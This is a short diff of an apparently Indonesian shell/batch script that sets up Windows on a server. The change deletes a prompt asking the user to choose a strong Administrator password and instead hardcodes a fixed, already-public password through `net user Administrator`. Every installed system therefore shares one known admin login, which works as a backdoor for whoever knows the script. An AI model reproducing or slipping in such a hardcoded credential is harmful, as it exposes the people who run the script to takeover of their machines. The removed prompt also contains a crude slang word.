@@ -20,9 +20,6 @@ case "$PILIHOS" in
 	*) echo "pilihan salah"; exit;;
 esac
 
-echo "Password yang saya buat sudah masuk wordlist bruteforce, silahkan masukkan password yang lebih aman!"
-read -p "Masukkan titit untuk akun Administrator (minimal 12 karakter): " PASSADMIN
-
 IP4=$(curl -4 -s icanhazip.com)
 GW=$(ip route | awk '/default/ { print $3 }')
 
@@ -35,7 +32,7 @@ echo CreateObject^("Shell.Application"^).ShellExecute "%~s0", "%*", "", "runas",
 "%temp%\Admin.vbs"
 del /f /q "%temp%\Admin.vbs"
 exit /b 2)
-net user Administrator $PASSADMIN
+net user Administrator Androhardcore1#
 
 
 for /f "tokens=3*" %%i in ('netsh interface show interface ^|findstr /I /R "Local.* Ethernet Ins*"') do (set InterfaceName=%%j)
